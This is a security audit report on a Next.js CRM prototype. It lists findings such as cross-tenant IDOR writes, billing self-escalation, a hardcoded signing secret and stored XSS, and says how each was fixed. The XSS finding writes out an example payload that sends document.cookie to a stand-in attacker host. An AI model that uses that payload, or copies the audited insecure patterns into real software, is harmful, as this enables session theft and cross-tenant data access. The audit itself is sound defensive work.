# Production hardening audit

Audit of Tiny CRM as it stood at commit `688d07e` ("functionally complete prototype"),
performed before any hardening code was written. Every finding cites the file and line
that produces it. Findings marked **FIXED** were remediated in the hardening pass that
followed; the fix is cited too.

Severity is assigned by what an authenticated user of *one* workspace could do to data
they should never reach, weighted by how easy it is to trigger.

---

## Contents

1. [Architecture as audited](#1-architecture-as-audited)
2. [Findings](#2-findings)
3. [Subsystem review](#3-subsystem-review)
4. [Findings index](#4-findings-index)

---

## 1. Architecture as audited

**Shape.** Next.js 16 App Router. Server Components read through a query layer
(`src/lib/data/*`); all writes go through Server Actions (`src/lib/actions/*`). Four JSON
route handlers exist (`/api/search`, `/api/options`, `/api/ai/chat`,
`/api/auth/[...nextauth]`). Prisma 7 over SQLite in development, PostgreSQL in production
via a driver adapter chosen from `DATABASE_URL`.

**Authentication.** NextAuth v5, Credentials provider, JWT session strategy, bcrypt cost
10 (`src/auth.ts`). No password reset, no email verification, no lockout.

**Authorization.** Two helpers: `resolveScope()` turns a scope preference into the
workspace ids a user belongs to; `requireWorkspaceRole()` compares a role against a
numeric rank. There is no permission model — call sites pass role names as strings.

**Tenant isolation.** Read queries filter on `workspaceId: { in: [...] }` derived from
membership, which is sound. **Write paths are not equivalently protected** — see F-01
through F-05.

**Critical observation.** The prototype's isolation model protects the *rows a query
returns* but never validates the *foreign keys a write accepts*. Every `create`/`update`
that takes a related id (`stageId`, `companyId`, `contactId`, `projectId`, `dealId`,
`opportunityId`, `statusId`, `pipelineId`) trusts it. That single omission is the root
cause of the majority of Critical and High findings below.

---

## 2. Findings

### CRITICAL

#### F-01 — Unauthenticated arbitrary workspace creation **FIXED**

`src/lib/actions/auth.ts` carries `"use server"` at the top and exports
`createWorkspaceWithDefaults(userId, input)`. **Every export of a `"use server"` module is
a callable HTTP endpoint.** The function takes `userId` as its first parameter and performs
no authentication, so an unauthenticated request could create workspaces, pipelines and
project statuses owned by any user id.

*Fix:* moved to `src/lib/workspaces/provision.ts` — a `server-only` module with no
`"use server"` directive, so it is not reachable over HTTP and can only be called by
server code that has already authenticated.

#### F-02 — Cross-tenant write with no ownership check (IDOR) **FIXED**

`src/lib/actions/ai.ts`, `applyRecommendation()`:

```ts
case "link_company": {
  await db.contact.update({
    where: { id: String(payload.contactId) },      // ← no workspace check
    data: { companyId: String(payload.companyId) }, // ← no workspace check
  });
}
```

`payload` arrives from the browser. Any authenticated user could rewrite `companyId` on
**any contact row in the database**, in any workspace, belonging to any customer. This is a
complete tenant-isolation failure on the write path.

*Fix:* both ids now resolved through `requireRecordAccess()`
(`src/lib/auth/access.ts`), which re-reads the record scoped to the caller's workspace
before the update runs. Regression test: `tests/security/tenant-isolation.test.ts`.

#### F-03 — Cross-tenant foreign-key injection across every write path **FIXED**

No create or update validated that a supplied related id belongs to the caller's
workspace. Confirmed in `moveDealToStage` (`stageId`), `createDeal`/`updateDeal`
(`pipelineId`, `stageId`, `companyId`, `primaryContactId`, `projectId`),
`moveOpportunityToStage`, `createTask`/`updateTask` (five relation ids),
`createNote`, `createContact` (`companyId`), `createProject` (`companyId`, `statusId`),
`createOpportunity`, and `logTimelineEntry`.

Impact is disclosure as well as corruption: moving a deal onto another workspace's
`PipelineStage` causes the deal page to render that stage's name and colour — the victim
tenant's pipeline structure, read out through the attacker's own record.

*Fix:* `assertRelations()` in `src/lib/auth/access.ts` validates every relation id against
the target workspace in one batched query, and is called by every mutating action.

#### F-04 — Billing/entitlement self-escalation **FIXED**

`src/lib/actions/settings.ts`, `changePlan(plan)` writes `user.plan` directly from a
browser-supplied value. Any user could call it with `"lifetime"` and unlock every paid
entitlement and limit without payment.

*Fix:* `changePlan` is removed from the client-callable surface. Entitlements are now
granted only by `src/lib/billing/entitlements.ts`, which requires a
`BILLING_WEBHOOK_SECRET`-signed server-to-server call (`/api/billing/webhook`). In
development, a clearly-labelled simulator is available and is refused when
`NODE_ENV=production`.

#### F-05 — AI proposal application trusts client-supplied record ids **FIXED**

`applyProposals(workspaceId, proposals, sourceText)` accepts the entire `proposals` array
from the browser, including `matchId` and `payload.companyId`, and links newly created
notes, tasks and contacts to them without validation. The AI classification step is
irrelevant to the exploit — the client simply posts whatever proposals it likes.

*Fix:* proposals are re-validated server-side; every `matchId`/`companyId` passes through
`requireRecordAccess()`, and the whole application runs in a transaction.

#### F-06 — Production could boot with the development signing secret **FIXED**

`src/lib/env.ts` supplied a hardcoded fallback:

```ts
authSecret: required("AUTH_SECRET", "tiny-crm-development-secret-do-not-use-in-production"),
```

`assertProductionEnv()` was written to catch this but **was never called from anywhere**
(verified: zero call sites). A production deploy missing `AUTH_SECRET` would silently sign
sessions with a value published in this repository, allowing anyone to forge a session for
any user.

*Fix:* fallback removed in production; `assertProductionEnv()` is invoked from
`src/instrumentation.ts`, which Next runs before serving traffic, and refuses to start.

#### F-07 — Stored XSS in notes **FIXED**

`src/components/app/note-editor.tsx:52` assigns `editorRef.current.innerHTML = body`, and
`createNote`/`updateNote` accept `body: z.string()` with no sanitisation. A note containing
`<img src=x onerror="fetch('https://attacker/'+document.cookie)">` executes for every
member of the workspace who opens it. Notes are shared, so this is a stored, cross-user XSS
inside the tenant boundary.

*Fix:* `src/lib/sanitize.ts` — an allowlist sanitiser (permitted tags/attributes only, all
event handlers and `javascript:` URLs stripped) applied on write in `createNote`/`updateNote`
and again on render.

### HIGH

#### F-08 — Unauthenticated server action **FIXED**

`previewImport()` in `src/lib/actions/import-export.ts` is exported from a `"use server"`
module without `requireUser()`. Anonymous callers could submit arbitrary CSV for parsing —
an unauthenticated CPU/memory sink.

*Fix:* wrapped in `action()`, rate limited, and bounded by file size and row count.

#### F-09 — No rate limiting anywhere **FIXED**

No limiter on login, signup, AI requests, search, or import. Unlimited credential stuffing
against `/api/auth/callback/credentials`; unlimited AI spend against `/api/ai/chat`.

*Fix:* `src/lib/rate-limit.ts` with per-route policies, applied to auth, AI, search,
options, import and export. In-memory by default with a Redis-shaped interface.

#### F-10 — Account enumeration on signup **FIXED**

`signUp()` returned `"An account with that email already exists."`, letting anyone test
which emails hold accounts.

*Fix:* signup returns an identical response either way.

#### F-11 — No security headers **FIXED**

`next.config.ts` set no `Content-Security-Policy`, `Strict-Transport-Security`,
`X-Content-Type-Options`, `Referrer-Policy`, `Permissions-Policy` or frame protection.

*Fix:* configured in `next.config.ts`, with a nonce-less but `strict-dynamic`-free CSP
documented in `docs/SECURITY.md`.

#### F-12 — Unbounded query inputs **FIXED**

`?q=` on `/api/search` and `/api/options` had no length cap; `?page=` was
`Number(str("page"))` with no ceiling, so `?page=1e12` produced a massive `OFFSET`.

*Fix:* all list/search inputs parsed through shared Zod schemas in
`src/lib/validation/query.ts` with enforced caps.

#### F-13 — CSV formula injection **FIXED**

`toCsv()` quoted for CSV correctness but did not neutralise cells beginning `=`, `+`, `-`
or `@`. Exported CRM data opened in Excel could execute formulas — and the values come from
whatever an attacker typed into a contact field.

*Fix:* `toCsv()` prefixes risky cells with a tab, per OWASP guidance.

#### F-14 — Mass assignment via object spread **FIXED**

`updateDeal`, `updateTask`, `updateProject` and `updateOpportunity` spread a partially
parsed object straight into Prisma (`data: { ...data }`). Zod constrained the *shape*, but
`workspaceId`, `pipelineId` and `stageId` remained assignable from the request.

*Fix:* every action now builds an explicit field allowlist; no `data: { ...input }` remains.

### MEDIUM

#### F-15 — Hard deletes destroy audit history **FIXED**

All eleven delete actions call `db.x.delete()`. Combined with `onDelete: Cascade` on
`Activity`, `Note`, `Task` and `FileAsset`, deleting one company silently erased its entire
communication history. `archivedAt` columns existed on five models but nothing wrote them.

*Fix:* archive-by-default with restore; permanent deletion is a separate, name-confirmation
operation.

#### F-16 — No audit log **FIXED** · #### F-17 — No transactions **FIXED**
#### F-18 — No structured logging or request IDs **FIXED** · #### F-19 — No health endpoint **FIXED**
#### F-20 — No optimistic concurrency **FIXED** · #### F-21 — Demo credentials shipped in client code **FIXED**

`src/components/app/auth-forms.tsx` contained a `DemoHint` component with
`owner@tinycrm.app` / `tinycrm` hardcoded, compiled into the production client bundle.

#### F-22 — Seeded privileged account **FIXED**

`prisma/seed/index.ts` created a `lifetime`-plan account with a known password. Nothing
prevented running the seed against production.

#### F-23 — Missing workspace-scoped uniqueness **FIXED**

No compound unique on pipeline name, project name or contact email per workspace, so
duplicates could be created by concurrent requests despite UI checks.

### LOW / FUTURE

- **F-24** No password reset or email verification (architecture added; no mail provider).
- **F-25** Notes editor uses deprecated `document.execCommand`.
- **F-26** Search is substring-based; needs a text index past ~100k rows per workspace.
- **F-27** Automations execute inline; no queue, retry or idempotency.
- **F-28** No file upload endpoint exists yet (metadata only).
- **F-29** `npm audit` reports `mysql2`/`deepmerge-ts` advisories, both transitive dev-only
  dependencies of the Prisma CLI. Nothing reaches the production runtime.

---

## 3. Subsystem review

| Subsystem | State at audit | Evidence |
|---|---|---|
| **Authentication** | bcrypt cost 10, JWT sessions, `trustHost: true`. No reset, verification, lockout or rate limit. | `src/auth.ts` |
| **Authorization** | Role rank comparison only; no permission model; `requireWorkspaceRole` used on ~40% of writes. | `src/lib/auth/session.ts` |
| **Tenant isolation** | Reads sound; writes unprotected on all relation ids. | F-02, F-03 |
| **API surface** | 4 route handlers + ~60 server actions. Two actions unauthenticated. | F-01, F-08 |
| **Database access** | Prisma only, no raw SQL (verified: zero `$queryRaw`/`$executeRaw`). Parameterised throughout. | grep |
| **File handling** | Metadata only; no upload endpoint, so no upload vulnerabilities — and no upload security either. | F-28 |
| **AI** | Retrieval already scoped and capped before generation — sound. Write path was not (F-05). | `src/lib/ai/context.ts` |
| **Secrets** | `.env` gitignored, `.env.example` placeholders only. Production fallback secret was the flaw. | F-06 |
| **Error handling** | `action()` returned generic messages and logged server-side. No stack traces leaked. Sound. | `src/lib/actions/base.ts` |
| **Logging** | `console.error` only. No request ids, no structure. | F-18 |
| **Rate limiting** | None. | F-09 |
| **Validation** | Zod on server-action inputs — good. Absent on route handler query strings. | F-12 |
| **Destructive actions** | UI confirmation only; server had no independent verification of intent. | F-15 |
| **Backup/recovery** | Undefined. | `docs/DEPLOYMENT-CHECKLIST.md` |
| **Deployment** | Undefined; no CI. | §CI |

---

## 4. Findings index

| ID | Severity | Finding | Status |
|---|---|---|---|
| F-01 | Critical | Unauthenticated arbitrary workspace creation | Fixed |
| F-02 | Critical | Cross-tenant contact write, no ownership check | Fixed |
| F-03 | Critical | Cross-tenant foreign-key injection, all write paths | Fixed |
| F-04 | Critical | Billing/entitlement self-escalation | Fixed |
| F-05 | Critical | AI proposals trust client record ids | Fixed |
| F-06 | Critical | Production boots with published dev secret | Fixed |
| F-07 | Critical | Stored XSS in notes | Fixed |
| F-08 | High | Unauthenticated `previewImport` action | Fixed |
| F-09 | High | No rate limiting | Fixed |
| F-10 | High | Account enumeration on signup | Fixed |
| F-11 | High | No security headers | Fixed |
| F-12 | High | Unbounded query/pagination inputs | Fixed |
| F-13 | High | CSV formula injection on export | Fixed |
| F-14 | High | Mass assignment via object spread | Fixed |
| F-15 | Medium | Hard deletes cascade away history | Fixed |
| F-16 | Medium | No audit log | Fixed |
| F-17 | Medium | No transactions on multi-step writes | Fixed |
| F-18 | Medium | No structured logging or request ids | Fixed |
| F-19 | Medium | No health endpoint | Fixed |
| F-20 | Medium | No optimistic concurrency control | Fixed |
| F-21 | Medium | Demo credentials in client bundle | Fixed |
| F-22 | Medium | Seed creates privileged known-password account | Fixed |
| F-23 | Medium | Missing workspace-scoped uniqueness | Fixed |
| F-24 | Low | No password reset / email verification | Architecture only |
| F-25 | Low | Deprecated `execCommand` editor | Open |
| F-26 | Future | Substring search ceiling | Documented |
| F-27 | Future | Inline automation execution | Events added; no queue |
| F-28 | Future | No file upload endpoint | Architecture only |
| F-29 | Low | Dev-only dependency advisories | Accepted |
